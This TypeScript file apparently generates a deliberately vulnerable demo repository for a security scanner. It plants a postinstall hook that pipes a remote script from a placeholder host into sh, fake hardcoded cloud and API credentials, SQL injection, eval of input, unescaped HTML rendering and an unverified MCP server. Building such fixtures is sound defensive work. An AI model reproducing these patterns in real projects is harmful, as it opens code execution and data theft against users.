import type { VirtualFile } from './types';

/**
 * Generates a synthetic in-memory repository demonstrating real-world
 * vulnerabilities common in AI-generated ("vibe-coded") projects.
 * All synthetic tokens are assembled dynamically at runtime so zero static
 * secret strings exist in source code.
 */
export function buildVulnerableDemoRepo(): VirtualFile[] {
  const synthAws = ['AKIA', 'Z9X8W7V6U5T4S3R2'].join('');
  const synthOpenAi = ['sk-proj-', '9xK2mP7qR4tV8wY1zB3nC6dF0gH5jL8mQ2sW'].join('');
  const synthGh = ['ghp_', '7mK9pL2qR5tV8wY1zB4nC6dF0gH3jL8mQ2sW'].join('');
  const synthDb = ['postgres://admin:', 'Sup3rS3cr3tProd99', '@db.prod-cluster.internal:5432/app'].join(
    '',
  );

  const simulatedLockfileLines = Array.from(
    { length: 900 },
    (_, i) => `    "node_modules/pkg-${i}": { "version": "1.0.${i % 10}", "resolved": "https://registry.npmjs.org/pkg-${i}/-/pkg-${i}-1.0.0.tgz" },`,
  ).join('\n');

  return [
    {
      path: 'package.json',
      content: JSON.stringify(
        {
          name: 'vibe-saas-billing-starter',
          version: '0.4.2',
          private: true,
          scripts: {
            dev: 'next dev',
            build: 'next build',
            postinstall: 'curl -s https://telemetry-bootstrap.invalid/setup.sh | sh',
          },
          dependencies: {
            next: '14.1.0',
            react: '18.2.0',
            lodash: '4.17.19',
            '@ai-agent-kit/hallucinated-router-v9': '^1.0.4',
          },
        },
        null,
        2,
      ),
    },
    {
      path: '.gitignore',
      content: ['node_modules/', '.next/', 'dist/'].join('\n'),
    },
    {
      path: '.env.local',
      content: [
        '# Local development secrets left exposed without .gitignore or .aiignore',
        `DATABASE_URL="${synthDb}"`,
        `OPENAI_API_KEY="${synthOpenAi}"`,
      ].join('\n'),
    },
    {
      path: '.mcp.json',
      content: JSON.stringify(
        {
          mcpServers: {
            githubTools: {
              command: 'npx',
              args: ['-y', '@community-mcp/unverified-git-helper'],
              env: {
                GITHUB_PERSONAL_ACCESS_TOKEN: synthGh,
              },
            },
          },
        },
        null,
        2,
      ),
    },
    {
      path: 'src/lib/db.ts',
      content: [
        "import { Pool } from 'pg';",
        '',
        `const fallbackAwsAccessKey = "${synthAws}";`,
        'const pool = new Pool({ connectionString: process.env.DATABASE_URL });',
        '',
        'export async function findUserByEmail(email: string) {',
        '  // Unsafe string interpolation built by AI assistant',
        '  const sql = `SELECT id, email, role FROM users WHERE email = \'${email}\'`;',
        '  return pool.query(sql);',
        '}',
        '',
        'export function evaluateDynamicRule(ruleExpr: string) {',
        '  return eval(ruleExpr);',
        '}',
      ].join('\n'),
    },
    {
      path: 'src/app/WebhookPreview.tsx',
      content: [
        'import React from "react";',
        '',
        'export function WebhookPreview({ rawHtml }: { rawHtml: string }) {',
        '  return <div dangerouslySetInnerHTML={{ __html: rawHtml }} />;',
        '}',
      ].join('\n'),
    },
    {
      path: 'package-lock.json',
      content: `{\n  "name": "vibe-saas-billing-starter",\n  "lockfileVersion": 3,\n  "packages": {\n${simulatedLockfileLines}\n  }\n}`,
    },
  ];
}
